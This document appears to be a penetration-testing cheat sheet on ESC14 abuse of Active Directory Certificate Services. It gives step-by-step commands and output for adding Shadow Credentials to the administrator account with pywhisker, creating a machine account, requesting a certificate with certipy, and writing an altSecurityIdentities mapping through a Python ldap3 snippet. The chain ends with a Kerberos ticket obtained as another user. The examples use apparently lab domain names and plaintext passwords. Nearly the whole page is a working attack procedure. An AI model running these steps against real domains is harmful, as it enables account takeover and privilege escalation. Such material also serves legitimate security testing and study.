title: ESC14: Shadow Credentials & Certificate Mapping
html:
ESC14A: Write access to msDS-KeyCredentialLink (Shadow Credentials) — certificate-based auth without enrollment. ESC14B: Cross-domain altSecurityIdentities mapping abuse.

ESC14A — Shadow Credentials via pywhisker

python3 pywhisker.py -d <domain> -u <username> -p <password> --target <target-user> --action add --dc-ip <dc-ip>
python3 pywhisker.py -d essos.local -u khal.drogo -p horse --target administrator --action add --dc-ip 192.168.56.12

[*] Target user found: CN=Administrator,CN=Users,DC=essos,DC=local
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Saved certificate to administrator_shadow.crt
[*] Saved private key to administrator_shadow.pem
gettgtpkinit.py -cert-pem <target-user>_shadow.pem -key-pem <target-user>_shadow.pem <domain>/<target-user> admin_shadow.ccache

ESC14A — Create Computer + Request Cert + Map to Target

addcomputer.py -method ldaps -computer-name 'esc14computer$' -computer-pass '<password>' -dc-ip <dc-ip> <domain>/<username>:<password>@<dc-ip>
addcomputer.py -method ldaps -computer-name 'esc14computer$' -computer-pass 'Il0veCertific@te' \
    -dc-ip 192.168.56.12 essos/missandei:fr3edom@192.168.56.12

[*] Successfully added machine account esc14computer$ with password Il0veCertific@te.
certipy req -target <ca-host> -u 'esc14computer$@<domain>' -p '<password>' -dc-ip <dc-ip> -template Machine -ca <ca-name>
certipy req -target braavos.essos.local -u 'esc14computer$@essos.local' -p 'Il0veCertific@te' \
    -dc-ip 192.168.56.12 -template Machine -ca ESSOS-CA

[*] CA Response : The certificate has been issued.
[*] Request ID  : 25
# Extract certificate details for mapping
certipy cert -pfx esc14computer.pfx -nokey -out esc14computer.crt
openssl x509 -in esc14computer.crt -noout -text | grep -E 'Serial|Issuer|Subject'

Build altSecurityIdentities Mapping

python3 x509_issuer_serial_number_format.py -serial "<cert-serial>" -issuer "CN=<ca-name>,DC=<domain>,DC=local"
python3 x509_issuer_serial_number_format.py \
    -serial "43:00:00:00:11:92:78:b0:92:e5:16:88:a6:00:00:00:00:00:11" \
    -issuer "CN=ESSOS-CA,DC=essos,DC=local"

X509:<I>DC=local,DC=essos,CN=ESSOS-CA<SR>110000000000a68816e592b078921100000043

Apply Mapping via Python ldap3

import ldap3
dn = "CN=<target-user>,CN=Users,DC=<domain>,DC=local"
server = ldap3.Server('<dc-host>')
con = ldap3.Connection(server, user='<domain>\\<username>', password='<password>', authentication=ldap3.NTLM)
con.bind()
con.modify(dn, {'altSecurityIdentities': [(ldap3.MODIFY_REPLACE, '<x509-mapping>')]})
print(con.result)
# Authenticate as target using computer certificate
gettgtpkinit.py -cert-pfx esc14computer.pfx -dc-ip <dc-ip> "<domain>/<target-user>" <target-user>.ccache
gettgtpkinit.py -cert-pfx esc14computer.pfx -dc-ip 192.168.56.12 "essos.local/khal.drogo" khal_tgt.ccache
[+] TGT request successful!
[*] Saved TGT to khal_tgt.ccache
excerpt: ESC14A: Write access to msDS-KeyCredentialLink (Shadow Credentials) — certificate-based auth without enrollment. ESC14B: Cross-domain altSecurityIdentities mapping abuse. ESC14A — Shadow Credentials v
